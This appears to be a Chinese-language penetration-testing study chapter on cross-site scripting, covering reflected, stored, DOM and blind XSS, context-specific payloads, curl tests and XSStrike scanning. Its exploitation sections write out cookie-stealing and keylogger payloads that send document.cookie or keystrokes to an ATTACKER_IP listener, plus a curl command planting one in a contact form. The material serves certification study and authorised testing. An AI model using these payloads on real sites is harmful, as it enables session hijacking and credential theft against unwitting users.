# 第 39 章 - XSS（跨站腳本）

## 標籤

- #cpts
- #chapter
- #web
- #xss

## 學習目標

- 能區分 Reflected、Stored、DOM-based XSS 並選擇對應測試方式。
- 理解輸出上下文（HTML / attribute / JS / DOM sink）對 payload 選擇的影響。
- 掌握最小化 PoC 驗證流程與工具使用。
- 能用 XSStrike / Burp 自動化掃描並手動確認。
- 知道如何從 XSS 進一步利用（Session 竊取、keylogger、BeEF）。

---

## 理論基礎：三類 XSS 與輸出上下文

```text
XSS 的本質：使用者輸入進入可執行上下文且缺乏適當防護

Reflected：輸入 → 後端 → 回應中直接回顯（單次觸發）
Stored：  輸入 → 後端儲存 → 其他使用者觀看時觸發（持久）
DOM-based：輸入 → 前端 JS 直接寫入 sink（不經後端）
Blind XSS：stored 的變體，觸發在攻擊者看不到的頁面（管理後台）
```

| 輸出上下文 | 範例 | 需要的 payload 形式 |
|-----------|------|-------------------|
| HTML 標籤間 | `<p>USER_INPUT</p>` | `<script>alert(1)</script>` |
| HTML attribute | `value="USER_INPUT"` | `" onmouseover="alert(1)` |
| JavaScript 字串 | `var x = 'USER_INPUT'` | `';alert(1);//` |
| URL 參數 | `href="USER_INPUT"` | `javascript:alert(1)` |
| DOM innerHTML sink | JS 直接寫入 | `<img src=x onerror=alert(1)>` |

---

## 識別 XSS 輸入點

```bash
# 常見可控輸入位置
# - URL query string：?name=John, ?search=test
# - POST form body：username=, comment=
# - HTTP Header：User-Agent, Referer, X-Forwarded-For
# - Cookie 值（若被回顯）
# - JSON API 回應欄位
# - URL fragment（#task=...）→ DOM-based 專屬

# 確認輸入是否被回顯
curl -s "http://TARGET/search?q=CANARY12345" | grep "CANARY12345"
# 若出現 CANARY12345 → 輸入有回顯 → 進一步確認上下文

# 確認回顯上下文（看 HTML 結構）
curl -s "http://TARGET/search?q=CANARY12345" | grep -A2 -B2 "CANARY12345"
# 看 CANARY 前後的 HTML 標籤 → 判斷在哪種上下文
```

---

## 方法一：Reflected XSS 測試

```bash
# Step 1：送入單引號確認語法敏感度
curl -s "http://TARGET/page?name=test'" | grep -i "error\|syntax\|exception"
# 若回應異常 → 可能有注入點

# Step 2：最小化 PoC（HTML 上下文）
curl -s "http://TARGET/page?name=<script>alert(window.origin)</script>"
# 用 window.origin 而不是 alert(1)
# → 執行後顯示頁面 origin，確認在哪個域下執行

# Step 3：attribute 上下文 payload
curl -s "http://TARGET/page?name=\" onmouseover=\"alert(1)"
# 若輸入落在 <input value="xxx">
# → 注入後變成 <input value="" onmouseover="alert(1)">

# Step 4：innerHTML sink（不接受 <script> 時）
curl -s "http://TARGET/page?name=<img src=x onerror=alert(window.origin)>"
# <img> 的 onerror 事件在圖片載入失敗時執行
# innerHTML 不執行直接插入的 <script>，但接受事件屬性

# Step 5：JavaScript 字串上下文 payload
curl -s "http://TARGET/page?name=';alert(window.origin);//"
# 若輸入落在 var x = 'USER_INPUT';
# → 注入後變成 var x = '';alert(window.origin);//';
# // 後面全部注釋掉，避免語法錯誤
```

---

## 方法二：Stored XSS 測試

```bash
# Step 1：確認提交入口（留言/Todo/個人簡介）
# 提交正常內容確認功能正常
curl -s -X POST http://TARGET/comment \
  -d "content=HelloWorld" \
  -b "session=MYSESSION" \
  -H "Content-Type: application/x-www-form-urlencoded"
# 確認 HelloWorld 出現在頁面上

# Step 2：提交最小 PoC
curl -s -X POST http://TARGET/comment \
  -d "content=<script>alert(window.origin)</script>" \
  -b "session=MYSESSION" \
  -H "Content-Type: application/x-www-form-urlencoded"

# Step 3：重新載入頁面確認持久性
curl -s http://TARGET/comments -b "session=MYSESSION" | grep -i "alert\|script"
# 若 payload 仍在 → 已儲存（stored XSS）

# Step 4：用不同 session 驗證跨使用者影響
curl -s http://TARGET/comments -b "session=OTHER_SESSION" | grep -i "alert\|script"
# 若其他用戶也能觸發 → 高危（跨使用者 stored XSS）
```

---

## 方法三：DOM-based XSS 測試

```bash
# DOM XSS 通常在瀏覽器端發生，curl 看不到完整執行
# 需要在瀏覽器中測試，或用工具分析前端程式碼

# 常見 source（前端讀取位置）
# document.URL / location.href
# location.search    → URL query string
# location.hash      → URL fragment（#後面）
# document.referrer

# 常見危險 sink（前端寫入位置）
# innerHTML / outerHTML
# document.write() / document.writeln()
# element.src / element.href
# eval() / setTimeout() / setInterval()

# 用瀏覽器測試（fragment 不送到後端）
# http://TARGET/page#task=<img src=x onerror=alert(window.origin)>
# → 若頁面 JS 讀取 location.hash 後直接寫入 innerHTML → DOM XSS

# 在 Burp 中觀察 DOM XSS
# 開 Proxy → 瀏覽到頁面 → 觀察 DOM Invader / DOM tab
# → 追蹤 source → sink 的資料流

# 簡單前端程式碼審計（找危險 sink）
# 下載 JS 檔案後搜尋
curl -s http://TARGET/app.js | grep -i "innerHTML\|document.write\|eval\|location.hash"
```

---

## 方法四：XSStrike 自動化掃描

```bash
# XSStrike 是針對 XSS 的自動化工具，比 sqlmap 更聰明地分析上下文

# 安裝
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
pip3 install -r requirements.txt

# 基本掃描（GET 參數）
python3 xsstrike.py -u "http://TARGET/page?name=test"
# 自動測試 name 參數的 XSS

# POST 請求
python3 xsstrike.py -u "http://TARGET/page" \
  --data "name=test&action=search"
# --data → 指定 POST body 參數

# 帶 Cookie（需要登入）
python3 xsstrike.py -u "http://TARGET/page?name=test" \
  --headers "Cookie: session=abc123"
# --headers → 設定自訂 Header

# 爬蟲模式（自動找輸入點）
python3 xsstrike.py -u "http://TARGET/" \
  --crawl -l 3
# --crawl → 啟動爬蟲
# -l 3    → 爬蟲深度 3 層

# 盲注模式（Blind XSS 用可觀測 URL）
python3 xsstrike.py -u "http://TARGET/page?name=test" \
  --blind
# --blind → 注入帶外回呼型 payload
```

---

## 方法五：進階利用（Session 竊取）

```bash
# Step 1：在攻擊機架設接收 server
python3 -m http.server 8000
# 監聽 8000 port → 接收受害者瀏覽器發出的請求

# Step 2：構造 Cookie 竊取 payload（stored XSS）
# payload：
# <script>document.location='http://ATTACKER_IP:8000/?c='+document.cookie</script>
# 說明：document.cookie 取得當前頁面 cookie，拼接到 URL 發到攻擊機

# URL 編碼版（若 POST body 需要編碼）
python3 -c "import urllib.parse; print(urllib.parse.quote('<script>document.location=\"http://ATTACKER_IP:8000/?c=\"+document.cookie</script>'))"

# Step 3：觀察攻擊機收到的請求
# GET /?c=PHPSESSID=abc123; auth=xyz → 竊取到 Session

# Keylogger payload（記錄鍵盤輸入）
# <script>
# document.onkeypress = function(e) {
#   fetch('http://ATTACKER_IP:8000/?k='+String.fromCharCode(e.which));
# }
# </script>
# 每次按鍵都發一個請求到攻擊機

# 完整 XSS payload 庫參考
# PayloadsAllTheThings：
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
```

---

## 方法六：Blind XSS（管理後台觸發）

```bash
# Blind XSS 的特性：payload 在攻擊者看不到的地方觸發
# 典型場景：
# - 聯絡表單 → 管理員後台查看
# - 支援工單 → 客服系統
# - 使用者名稱 → 稽核 log 頁面

# 用外部可觀測 payload 驗證
# 需要一個外部 server 接收回呼

# XSS Hunter（雲端版，已停服）→ 改用 XSS Hunter Express（自架）
# 或用 Burp Collaborator / interactsh

# 基本 Blind XSS payload
# <script>
# var img = new Image();
# img.src = 'http://ATTACKER_IP:8000/?x=' + document.domain
#   + '&cookie=' + document.cookie
#   + '&url=' + document.URL;
# </script>
# 觸發時把 domain、cookie、URL 全部發到攻擊機

# 提交到聯絡表單
curl -X POST http://TARGET/contact \
  -d "name=test&email=test@test.com&message=<script>var img=new Image();img.src='http://ATTACKER_IP:8000/?d='+document.cookie</script>" \
  -H "Content-Type: application/x-www-form-urlencoded"
# 等待管理員查看後台 → 攻擊機收到回呼 → Blind XSS 確認
```

---

## XSS 上下文判斷決策樹

```
觀察輸入回顯位置
    ├─ 在 HTML 標籤之間（純文字節點）
    │   └─ 試 <script>alert(window.origin)</script>
    │       └─ 若被過濾 → 試 <img src=x onerror=alert(1)>
    │
    ├─ 在 HTML attribute 值中（value="HERE"）
    │   └─ 試 " onmouseover="alert(1)（雙引號跳出）
    │       └─ 或 ' onerror='alert(1)（單引號跳出）
    │
    ├─ 在 JavaScript 字串中（var x = 'HERE'）
    │   └─ 試 ';alert(1);//（關閉字串，插入語句）
    │
    ├─ 在 URL href 中（href="HERE"）
    │   └─ 試 javascript:alert(window.origin)
    │
    └─ 在 DOM sink 中（innerHTML / document.write）
        └─ 試 <img src=x onerror=alert(window.origin)>（不用 <script>）
```

---

## 速查表

```bash
# 確認回顯
curl -s "http://TARGET/page?q=CANARY" | grep CANARY

# 最小 PoC（HTML 上下文）
# GET ?name=<script>alert(window.origin)</script>

# Attribute 上下文
# GET ?name=" onmouseover="alert(1)

# innerHTML sink（onerror）
# GET ?name=<img src=x onerror=alert(window.origin)>

# JS 字串上下文
# GET ?name=';alert(1);//

# XSStrike 掃描
python3 xsstrike.py -u "http://TARGET/page?name=test"

# Session 竊取 payload
# <script>document.location='http://ATTACKER_IP:8000/?c='+document.cookie</script>

# Stored XSS 驗證持久性
curl -s http://TARGET/comments | grep -i "script\|alert"
```

---

## 關聯筆記

- [[36-Web請求分析|第 36 章 - Web 請求分析]]
- [[37-身分驗證攻擊|第 37 章 - 身分驗證攻擊]]
- [[04-Volume-4-Web-Index|Vol.4 - Web Information Gathering and Attacks]]
